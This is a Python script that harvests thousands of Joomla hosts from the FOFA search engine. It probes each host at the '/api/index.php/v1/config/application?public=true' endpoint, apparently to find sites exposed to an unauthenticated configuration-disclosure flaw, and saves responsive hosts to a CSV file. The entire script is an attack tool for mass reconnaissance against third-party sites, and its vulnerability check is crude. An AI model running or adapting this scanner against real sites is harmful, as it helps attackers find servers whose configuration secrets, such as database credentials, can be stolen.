import requests
import fofa
def verify(url):
    payload = '/api/index.php/v1/config/application?public=true'
    if not url.startswith("http"):
        url = "http://" + url
    try:
        response = requests.get(url + payload)
        if response.status_code != 200:
            # print("[Unvulnerable]")
            return False
        else:
            if "404" in response.text:
                return False
            return True
    except Exception:
        # print("Error")
        return False

if __name__ == '__main__':
    email = ''
    key = ''
    client = fofa.Client(email, key)
    query_str = 'app="Joomla"'
    filename = "results.csv"
    hosts = []
    for page in range(1, 61):
        data = client.search(query_str, page=page, size=100, fields="host")
        print(data)
        for url in data["results"]:
            # print(url)
            if verify(url):
                hosts.append(url)
    with open(filename, "w") as f:
        f.write("\n".join(hosts))